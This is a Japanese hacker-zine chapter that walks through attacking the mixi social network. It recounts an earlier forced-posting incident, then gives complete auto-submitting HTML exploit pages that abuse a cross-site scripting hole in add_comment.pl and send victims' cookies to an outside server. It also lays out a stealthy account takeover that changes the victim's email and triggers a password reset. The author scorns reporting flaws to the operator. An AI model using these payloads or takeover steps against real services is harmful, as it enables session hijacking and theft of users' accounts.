x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第16章: ソーシャルネットワーキングサイトmixiをハクる ---

著者：Zer0real

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x01.) ハクる前に

　ミクシィはここのところ、はまちたんのおかげでかなりセキュリティが甘いこ
とで有名になってしまったので、俺もついでにミクシィをハクってみた。今回は
その経緯を書くことにする。
　ミクシィ管理局に直接いってもいいが、まーどうせアカ剥奪されるのがオチだ
ろうからこっちに書くことにする。
　さてと、で、さっそくだがミクシィアカウント持ってないやつはこれ読んでも
わからないだろうからここでお別れだ。力になってあげられなくて残念だ。あと
最低でもHTMLくらいはちゃんとわかるやつが読んでくれないとこっちも困るので
その辺はよろしく。


■0x02.) はまちたんのハック

http://simon.tmn.net/wiki/index.php?mixi%2F%A4%DC%A4%AF%A4%CF%A4%DE%A4%C1%A4%C1%A4%E3%A4%F3%A1%AA

　一躍有名人になったはまちたんのハックは上のURLを見てくれ。かなり詳しく書
いてあるからこっちで俺が説明するまでもないだろう。
　はまちたんのハックを簡単にいうならば、ミクシィ以外のサーバーに投稿フォー
ムを置いておき、そのページを読み込んだら強制的にミクシィ投稿するようにし
ていたわけだ。そのリンクをミクシィ内に書いておいたらブラウザはミクシィに
ログインしている状態でリンクを踏むことになり投稿が完了するということ。
　これを防ぐにはサーバーサイドプログラミングでいろいろとややこしいことをし
なければならない。リファラがなんたらPOSTやGETがどうこうという話をどこかで
見たが、そんなのは結局ほとんど役に立たないのが現状だろう。まーしないに越
したことはないがね。


■0x03.) ヤフーも取り上げたはまちたん

http://headlines.yahoo.co.jp/hl?a=20050423-00000012-zdn_ep-sci

　あのはまちたんはヤフーでも取り上げられるほど有名になった。が、ちょっと
上の記事を読んでみてくれ。もしかしたらリンク切れになってるかもしれないが、
そのときはネタ元にいけばよい。

ネタ元
http://www.itmedia.co.jp/enterprise/articles/0504/23/news005.html

-----
サービスを提供しているイー・マーキュリーでは、この現象について一応の対処
は取った模様だ。ただ、技術的な詳細については「ハッキングでもなく、サーバー
攻撃やウイルスでもない。ID盗難などの被害は発生していない」という回答のみ
で、「それ以上はコメントできない」と述べるにとどまっている。
-----

　あれだけ大騒がせしたあのはまちたんのハックをイー・マーキュリーは「ハッ
キングでもなく、サーバー攻撃やウイルスでもない。ID盗難などの被害は発生して
いない」という一言でまとめている。
　あれだけやられておいてその言い草はどうかと思うが、まー否定はしない。確
かにハッキングでもなければ、サーバー攻撃でもなく、ウイルスでもない。ID盗難
の意味が分からないが、IDをセッションIDと考えればそうだしね。
　要するにお前のやったことは大したことないと言っているわけだ。あれだけや
られておいて何をいってんだとも思うが、気持ちはわからんでもない。


■0x04.) はまちたんができたこと

　じゃあ、はまちたんはいったい何ができたのか、それを考えてみる。
　はまちたんは他人にリンクをクリックさせることによって、クリックした人物
の日記を更新させたわけだが、他にどんなことができたのか。このことについて
はまちたんはこういっている。

-----
踏んだ人がmixi内でできる「すべてのこと」をやらせられる。
たとえば
踏んだ人に、無限に日記やコメントを書かせたり
踏んだ人のメッセージ送受信箱の中身をゲットしたり
さらにそれをどこぞの掲示板に(その人自らが)晒したり
とか、込み入ったこともできるとかなんとか。物騒だね。 
-----

　とりあえずこの言葉には間違いがひとつある。それは、踏んだ人がmixi内でで
きる「すべてのこと」をやらせられるという一文。確かにほぼすべてのことがで
きるが、残念ながら強制的に退会させることはできない。退会時にはパスワード
が必要だからだ。
　そのことについては、あとになってはまちたん自身も述べている。まーだとし
ても危険なことができることに変わりはないがね。


■0x05.) はまちたんができなかったこと

　俺のミクシィハックの経緯を書くとか言っておきながら、始まってすぐからは
まちたんのことばかりだが、もう少し読み進めて欲しい。

　じゃあ、はまちたんができなかったことは何か。それはイー・マーキュリーの
解答から読み取れる。

「ID盗難などの被害は発生していない」

　まさにこれだ。仮にサーバー攻撃やウイルスだったらその攻撃者あるいは作成者
の目的はひとつだ。セッションIDやパスワードを盗むこと。しかし、はまちたん
はその運営側がもっとも嫌がることをやっていない。なぜか。それはできなかっ
たからだ。
　踏んだ人がmixi内でできる「すべてのこと」をやらせられるが、セッションID
やパスワードを盗むことはできなかったのである。
　イー・マーキュリーからのコメントにある「ハッキングではない」の一言。一
理ある。はまちたんのやったことはハッキングよりもむしろ荒らし行為に近かっ
た。そしてセキュリティホールが修正された現在はまちたんに残ったものはアカ
剥奪という現実だったわけだ。


■0x06.) 本当のハック

　運営側にバレないようにセッションIDやパスワードを盗むこと、これが本当の
ハックってもんじゃないの？
　つーわけで、ここからが俺のハック話だ。なるべくわかりやすく解説するつも
りだが、技術的な観点よりもむしろセキュリティホールを探しあてるまでの過程
を楽しんでくれ。実際それが一番難しい作業だからな。
　スキルもまー大事ではあるが、実戦では「勘」ってやつの方が重要だ。それを
身につけるためには努力よりも才能がものをいうが、実戦を積むことである程度
磨かれることは確かだぜ。じゃあスタートだ。

　こういったCGIの穴を探す手っ取り早い方法はライティングを行うプログラムを
狙うことだ。ライティングってのは要するにサーバー側にあるファイルへ書き込む
処理を担当しているプログラムってこと。ミクシィ内で代表的なものは日記やメ
ッセージだが、プロフィールやコミュニティなどいろいろあるだろう。
　そして通常とは違う処理をしている部分を探すんだ。例えば、日記は2ch型のB
BSと大して変わらない。よってここ（view_diary.pl）には穴がある確率は低いと
いうことだ。すでに成熟した技術が使われていることは間違いないからな。
　さらにいい忘れたが、ミクシィのプログラムはすべてPerl製だ。拡張子で一目
瞭然。だからPerlによくありそうな穴を探すんだ。
　それで10分ほどミクシィ内を徘徊する。勘を頼りによく使われるCGIと違う処
理をしている部分を探すんだ。この辺は経験がものをいうからこれから数をこな
していけばいいさ。とりあえず俺はもう見つけたぜ。普段よく使われるCGIとは
違う処理をしている部分だ。

　俺が目をつけたのは確認画面だ。メッセージを送信するとき、日記を更新する
とき、ミクシィは様々なところでその確認画面を表示する。これはすこしクドイ
な。だが、少なくともこれはちょっと普段のBBSなどでは見ない光景だ。2chでさ
え確認は最初の投稿だけで、その後クッキーをゲットしてしまえば確認画面はな
い。
　さて日記のレスを管理しているのはadd_comment.plのようだな。ご丁寧に「下
記のコメントを書き込みますか？」と確認してくれる。じゃあそこでHTMLをみて
みようか。

-----
<form action="add_comment.pl?diary_id=11111111&owner_id=111111" method=post>
<input type=hidden name=submit value=confirm>
<input type=hidden name=comment_body value="test">
<input type=hidden name=owner_id value="111111">
<input type=hidden name=post_key value="ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ">
<td><input type=submit value="　書き込み　"></td>
</form>
-----

　inputタグのcomment_bodyに入力したデータが入っているのが分かる。ふーん、
ならそこにタグや「"」をいれられるのか試してみようぜ。

-----
<form action="add_comment.pl?diary_id=11111111&owner_id=111111" method=post>
<input type=hidden name=submit value=confirm>
<input type=hidden name=comment_body value="&quot;<b>test</b>">
<input type=hidden name=owner_id value="111111">
<input type=hidden name=post_key value="ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ">
<td><input type=submit value="　書き込み　"></td>
</form>
-----

　なるほどね。タグは入れられるけど「"」は「&quot;」に変換されているな。こ
れじゃ、この部分にHTMLコードを埋め込むのは難しそうだ。一応いろいろと試し
てみたが「"」が使えないならどんなにコードを書いてもcomment_bodyのデータと
しか見られない。そもそも&quot;に変換しているということは、以前ここになん
らかの穴があってそれに対応した感じだ。もう修正済みというわけか。ちっ。
　だが、真のハッカーってのはここで勘ってやつを働かせるわけさ。プログラマ
はcomment_bodyに対しては完全に対処している。なぜかって？　ユーザーが入力
データを挿入できる部分がここしかないからさ。ここさえ抑えてれば問題ない。
プログラマはそう考えているわけだ。だったら裏をかいてこんなページを用意し
てみようか。

-----
<html>
<head>
<script><!--
function send_mixi(){
  f1.submit();
  return;
}
--></script>
</head>
<body onLoad="send_mixi();">
<form name="f1" action='http://mixi.jp/add_comment.pl?diary_id=15331801"></form><b>test</b>' method=post>
<input type=hidden name=comment_body value="test">
<input type=submit value="write">
</form>

</body>
</html>
-----

　よーくみてくれよ。特にformタグのaction属性をな。<b>test</b>が有効になる
かどうかをみてみることにするぜ。

[[picture]]
動作確認画像
http://akademeia.info/wizardbible/17/image/m1.png

　フン。<b>test</b>が有効になっちまったよ。つまりこれはどんなコードでも実
行してくれるってことだろ。だったら実行するコードはひとつだよ。そう、セッ
ションIDを盗むってことだな。
　つまりlocation.hrefとdocument.cookieを使って、適当なサーバーへ投げてやれ
ばそれで盗聴完了ってわけだ。おいおい、ミクシィのプログラマは何やってんだ
ろうねぇ。数分もしないうちにハクられるようなアプリよく作れるなぁ。ミクシ
ィ管理者のスキルのほどが知れるってわけだ。

　んじゃ最後に俺が作ったページを晒して終わりにするとしようか。

-----
<html>
<head>
<script><!--
function send_mixi(){
  f1.submit();
  return;
}
--></script>
</head>
<body onLoad="send_mixi();">
<form name="f1" action='http://mixi.jp/add_comment.pl?diary_id=15331801"></form><script>location.href="http://ruffnex.oc.to/ipusiron/cgi/envcheck.cgi?"%2Bdocument.cookie%3B</script>' method=post>
<input type=hidden name=comment_body value="test">
<input type=submit value="write">
</form>

</body>
</html>
-----

　こんなところだ。確認にはセキュリティアカデメイアのENVチェッカーを利用さ
せてもらった。注意するとこは「+」や「;」をURLエンコードしてやらないといけ
ないってとこくらいか。つか読めば分かるな。あとサンプルページを次に示す。
ミクシィにログインした状態のブラウザで試してくれよ。

サンプルページ
http://ruffnex.oc.to/exp4.html

[[picture]]
動作確認画像
http://akademeia.info/wizardbible/17/image/m2.png


■0x07.) パスワードを盗む

　ここまで読んだ賢明な読者なら、はまちたんなんてここで紹介した方法に比べ
ればゴミみたいなもんだとわかるだろう。メッセージを送ったり、日記を勝手に
書いたり、そんなのはイタズラ好きの屑がやることだ。俺が紹介した方法は、セ
ッションハイジャックだ。つまり、他人になりすますことができるんだな。これ
がどんなことかわかるだろうか？　勝手にログインされていることにやられた側
はほとんど気が付かないわけだ。真のハッカーは、いや俺は職業クラッカーだけ
ど（ワラ）、侵入したことを相手に悟られてはダメなんだ。悟られてしまったら、
何らかのセキュリティを施されたり、管理人に通報されて、おいしい情報を奪え
ないからな。

　何？　なりすましができたとしても、パスワードはわからないではないかって
？　それは早計だ。よく考えてほしい。プロフィールの変更画面があるだろ。他
人になりすまして、そのアカウントでプロフィールの変更画面にアクセスする。
そこにはパスワードを変更という入力フィールドがあるが、ここで変更してしま
ってはならない。正規のユーザーがアクセスできなくなってしまい、不振がって
しまう。それではどうするか。よくそのページを見て欲しい。メール変更のため
のフィールドがあるだろ。そこを俺のメールアドレスに変更する。そして、ログ
アウトして、パスワードを忘れたというリンクを押して、パスワードをメール送
信させてしまうのだ。そして、パスワードを入手して、ログインしたら、再びプ
ロフィールの変更画面にアクセス。メールを最初のメールアドレス（正規のユー
ザーのもの）に戻しておく。これで完璧である。

　このセッションハイジャックから身を守るには、不用意にリンクをクリックし
ないことだ。怪しいURLはもちろんだが、怪しい人物の発言のURLにも気をつけな
ければならない。さらに、信頼しているマイミクシィの友人の発言のURLであって
も、すぐにクリックするのは止めたほうがよい。なぜなら、その友人がすでにの
っとられている可能性もあるからだ。つーか、誰も信用しちゃだめだってことだ
な。ミクシィ崩壊も近いか？（編注）

【編注】残念ながら（？）、このセキュリティホールは28日の正午過ぎ辺りに閉
じられてしまったようです。リリースが間に合わなくて申し訳ありませんでした
…。


■0x08.) 感想

　大したことはないだろうとは思ってたが、これほどまでとはちょっと予想外だ
ったよ。つっても一応俺もコレで飯食ってる人間なんでミクシィみたいな脆弱な
プログラムがたくさん出回ってくれた方が仕事もやりやすいわけだがな。
　毎日、堅牢なサーバー相手にアタックしてる俺みたいなやつにとってはミクシ
ィなんて格好の餌食なんだが、逆にこの程度じゃ依頼が来ないってのがこの業界
の実情だ。今回は、IPUSIRONにおもしろいネタ投稿してくれといわれたことから
やったって感じだ。といいつつ、ミクシィ内のバグ関連のコミュの連中がむかつ
いたというのが大きな動機だけどな（ワラ）。自称フルディスクロージャーとか、
自称ホワイトハットの連中はうんざりだ。本物のフルディスクロージャーとして
の思考なら、何でもありだろ。本当のフルディスクロージャーの思想を否定する
わけじゃない。そんな中、一応バグを一般公開する前に管理者に報告したほうが
好ましいというだけであって、義務じゃない。俺は報告したくないから、報告し
ない。報告したい人は報告すればいいだけだ。まあ、一番むかつくのは、報告し
たら報告したで逆切れする連中だな。あいつらファシストだろ（ワラ）。自分の
都合で思想の定義を勝手にゆがめてるだけ。まあ愚痴のこのぐらいにしておこう。

　さてと、これで終わりだ。もう二度と会うこともないだろうけど、お互いハッ
キングを楽しもうぜ。んじゃな。
